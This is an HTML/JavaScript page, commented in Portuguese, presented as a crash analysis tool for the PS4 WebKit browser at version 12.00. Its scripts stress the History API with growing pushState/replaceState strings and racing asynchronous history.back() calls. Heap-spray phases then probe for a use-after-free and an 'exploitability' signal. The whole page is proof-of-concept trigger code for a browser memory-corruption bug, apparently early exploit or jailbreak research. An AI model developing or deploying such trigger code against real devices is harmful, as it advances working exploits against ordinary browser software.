<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit Crash Analyzer</title>
<style>
body { 
    font-family: 'Courier New', monospace; 
    background: #0a0a0a; 
    color: #00ff00; 
    padding: 20px;
}
.container {
    max-width: 1200px;
    margin: 0 auto;
}
h2 { color: #00ff88; border-bottom: 2px solid #00ff88; padding-bottom: 10px; }
h3 { color: #00ddff; margin-top: 20px; }
button { 
    font-size: 16px; 
    padding: 12px 20px; 
    margin: 8px; 
    background: #003300;
    color: #00ff00;
    border: 2px solid #00ff00;
    cursor: pointer;
    font-family: monospace;
}
button:hover { background: #004400; }
button.danger { background: #330000; border-color: #ff0000; color: #ff6666; }
button.danger:hover { background: #440000; }
#log { 
    white-space: pre-wrap; 
    margin-top: 15px; 
    background: #001100;
    padding: 15px;
    border: 1px solid #00ff00;
    max-height: 500px;
    overflow-y: auto;
}
.info { color: #ffff00; }
.warning { color: #ff9900; }
.error { color: #ff0000; }
.success { color: #00ff00; }
.stats {
    background: #001a1a;
    padding: 10px;
    margin: 10px 0;
    border-left: 4px solid #00ffff;
}
</style>
</head>

<body>
<div class="container">
<h2>üîç PS4 WebKit v12.00 ‚Äì Crash Analysis Tool</h2>

<div class="stats">
<strong>Configura√ß√£o Atual:</strong><br>
BASE: <span id="baseVal">977</span> bytes | 
STEP: <span id="stepVal">14461</span> bytes | 
SAFE_ITERS: <span id="safeVal">49</span><br>
Tamanho no ITER 48: <span id="size48">695105</span> bytes (~679 KB)
</div>

<h3>üß™ Testes Originais</h3>
<button onclick="runOptionA()">Option A ‚Äì UAF Detection (Sem Crash)</button>
<button onclick="runOptionB()" class="danger">Option B ‚Äì Crash Test (49+Partial)</button>

<h3>üî¨ Testes Diagn√≥sticos</h3>
<button onclick="testBoundary()">Test: Encontrar Limite Exato</button>
<button onclick="testWithoutAsync()">Test: Sem history.back() Ass√≠ncrono</button>
<button onclick="testMemoryPressure()">Test: Press√£o de Mem√≥ria Isolada</button>
<button onclick="testTiming()">Test: An√°lise de Timing</button>

<h3>‚öôÔ∏è Controles</h3>
<button onclick="clearLog()">Limpar Log</button>

<div id="log"></div>
</div>

<script>
const logEl = document.getElementById("log");
let crashData = [];

function log(m, type = 'normal'){
    const colors = {
        normal: '',
        info: 'info',
        warning: 'warning',
        error: 'error',
        success: 'success'
    };
    const timestamp = new Date().toLocaleTimeString();
    const line = `[${timestamp}] ${m}`;
    logEl.innerHTML += `<span class="${colors[type]}">${line}</span>\n`;
    logEl.scrollTop = logEl.scrollHeight;
}

function clearLog(){ logEl.innerHTML = ""; }
function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }

const BASE = 977;
const STEP = 14461;
const SAFE_ITERS = 49;

// Atualizar stats na UI
document.getElementById('baseVal').textContent = BASE;
document.getElementById('stepVal').textContent = STEP;
document.getElementById('safeVal').textContent = SAFE_ITERS;
document.getElementById('size48').textContent = BASE + (48 * STEP);

// -------------------------------------------------
// CORE SEQUENCE
// -------------------------------------------------
async function historySequence(iterations, allowPartial, skipAsync = false){
    let size = BASE;
    let asyncCalls = 0;

    for(let i=0;i<iterations;i++){
        const payload = "A".repeat(size);
        log(`[ITER ${i}] size=${size.toLocaleString()}`, 'info');

        history.pushState({}, "", "#"+payload);
        history.replaceState({}, "", "#"+payload.slice(0, payload.length >> 1));

        if(!skipAsync && i % 6 === 0){
            setTimeout(()=>history.back(),0);
            asyncCalls++;
            log(`  ‚Ü≥ history.back() ass√≠ncrono disparado (#${asyncCalls})`, 'warning');
        }

        size += STEP;
        await sleep(5);
    }

    if(allowPartial){
        log("[PARTIAL] Executando pushState extra (GATILHO)", 'error');
        const payload = "B".repeat(size);
        history.pushState({}, "", "#"+payload);
        log(`[PARTIAL] pushState completo (${size.toLocaleString()} bytes)`, 'error');
    }

    return asyncCalls;
}

// -------------------------------------------------
// OPTION A
// -------------------------------------------------
async function runOptionA(){
    clearLog();
    log("=== OPTION A: UAF/Estado Inconsistente ===", 'success');
    
    try {
        await historySequence(SAFE_ITERS, false);
        log("[‚úì] Sequ√™ncia de hist√≥rico completada", 'success');

        await sleep(120);

        log("[‚Üí] Fase de reutiliza√ß√£o de heap", 'info');
        let arr = [];
        for(let i=0;i<40;i++){
            arr.push("OBJ_"+i+"_"+"X".repeat(256));
        }

        log("[‚Üí] Usando dados ap√≥s stress de hist√≥rico", 'info');
        for(let i=0;i<arr.length;i++){
            let s = arr[i] + arr[(i+1)%arr.length];
            if(i % 8 === 0) log(`  uso len=${s.length}`, 'info');
        }

        log("=== OPTION A FINALIZADA ‚Äì SEM CRASH ===", 'success');
        log(">>> Indica corrup√ß√£o latente / janela UAF <<<", 'warning');

    } catch(e){
        log("[‚úó] Exce√ß√£o JS: " + e, 'error');
    }
}

// -------------------------------------------------
// OPTION B
// -------------------------------------------------
async function runOptionB(){
    clearLog();
    log("=== OPTION B: Sinal de Exploitabilidade ===", 'error');
    
    try {
        await historySequence(SAFE_ITERS, true);
        log("[!] Hist√≥rico + itera√ß√£o parcial completada", 'warning');

        await sleep(80);

        log("[‚Üí] Intera√ß√£o m√≠nima com heap ap√≥s limite", 'info');
        let tmp = [];
        for(let i=0;i<20;i++){
            tmp.push("Z".repeat(512));
        }

        log("[‚Üí] Uso p√≥s-limite", 'info');
        for(let i=0;i<tmp.length;i++){
            let s = tmp[i] + tmp[(i+3)%tmp.length];
            if(i % 5 === 0) log(`  uso len=${s.length}`, 'info');
        }

        log("=== OPTION B FINALIZADA ===", 'success');
        log(">>> Se comportamento difere ou crash move, exploitabilidade confirmada <<<", 'warning');

    } catch(e){
        log("[‚úó] Exce√ß√£o JS: " + e, 'error');
    }
}

// -------------------------------------------------
// TESTE: Encontrar limite exato
// -------------------------------------------------
async function testBoundary(){
    clearLog();
    log("=== TESTE: Busca Bin√°ria do Limite de Crash ===", 'info');
    
    let low = 40;
    let high = 55;
    let crashPoint = null;

    for(let test = low; test <= high; test++){
        log(`\n[TESTE ${test}/${high}] Tentando ${test} itera√ß√µes...`, 'warning');
        
        try {
            await historySequence(test, true);
            await sleep(100);
            
            // Tenta usar mem√≥ria
            let arr = [];
            for(let i=0;i<10;i++) arr.push("TEST".repeat(1000));
            
            log(`[‚úì] ${test} itera√ß√µes: SEM CRASH`, 'success');
            await sleep(50);
            
        } catch(e){
            log(`[‚úó] ${test} itera√ß√µes: CRASH DETECTADO!`, 'error');
            crashPoint = test;
            break;
        }
    }

    if(crashPoint){
        log(`\n>>> LIMITE DE CRASH: ~${crashPoint} itera√ß√µes <<<`, 'error');
    } else {
        log(`\n>>> Nenhum crash detectado at√© ${high} itera√ß√µes <<<`, 'success');
    }
}

// -------------------------------------------------
// TESTE: Sem history.back() ass√≠ncrono
// -------------------------------------------------
async function testWithoutAsync(){
    clearLog();
    log("=== TESTE: Sem history.back() Ass√≠ncrono ===", 'info');
    log("Objetivo: Isolar se race condition √© a causa\n", 'warning');
    
    try {
        await historySequence(SAFE_ITERS, true, true); // skipAsync = true
        await sleep(100);
        
        log("[‚úì] Sequ√™ncia completada SEM chamadas ass√≠ncronas", 'success');
        log(">>> Se N√ÉO crashar: race condition confirmada como causa <<<", 'warning');
        
    } catch(e){
        log("[‚úó] Crash mesmo sem async: " + e, 'error');
        log(">>> Problema n√£o √© race condition, √© overflow/fragmenta√ß√£o <<<", 'warning');
    }
}

// -------------------------------------------------
// TESTE: Press√£o de mem√≥ria isolada
// -------------------------------------------------
async function testMemoryPressure(){
    clearLog();
    log("=== TESTE: Press√£o de Mem√≥ria sem History API ===", 'info');
    
    try {
        let arrays = [];
        let size = BASE;
        
        for(let i=0; i<50; i++){
            const bigStr = "M".repeat(size);
            arrays.push(bigStr);
            log(`[${i}] Alocado: ${size.toLocaleString()} bytes`, 'info');
            size += STEP;
            await sleep(5);
        }
        
        log("[‚úì] 50 aloca√ß√µes grandes: SEM CRASH", 'success');
        log(">>> Problema √© espec√≠fico da History API, n√£o press√£o geral <<<", 'warning');
        
    } catch(e){
        log("[‚úó] Crash na press√£o de mem√≥ria: " + e, 'error');
    }
}

// -------------------------------------------------
// TESTE: An√°lise de timing
// -------------------------------------------------
async function testTiming(){
    clearLog();
    log("=== TESTE: An√°lise de Timing da Race Condition ===", 'info');
    
    const delays = [0, 5, 10, 20, 50];
    
    for(const delay of delays){
        log(`\n[‚Üí] Testando com delay de ${delay}ms entre opera√ß√µes`, 'warning');
        
        try {
            let size = BASE;
            for(let i=0; i<50; i++){
                const payload = "T".repeat(size);
                history.pushState({}, "", "#"+payload);
                history.replaceState({}, "", "#"+payload.slice(0, payload.length >> 1));
                
                if(i % 6 === 0){
                    setTimeout(()=>history.back(), 0);
                }
                
                size += STEP;
                await sleep(delay); // Delay vari√°vel
            }
            
            log(`[‚úì] Delay ${delay}ms: SEM CRASH`, 'success');
            
        } catch(e){
            log(`[‚úó] Delay ${delay}ms: CRASH ‚Äì ${e}`, 'error');
            log(`>>> Timing cr√≠tico identificado: ${delay}ms <<<`, 'error');
        }
        
        await sleep(200);
    }
}

log(" Ferramenta de an√°lise pronta. Escolha um teste.", 'success');
</script>
</body>
</html>
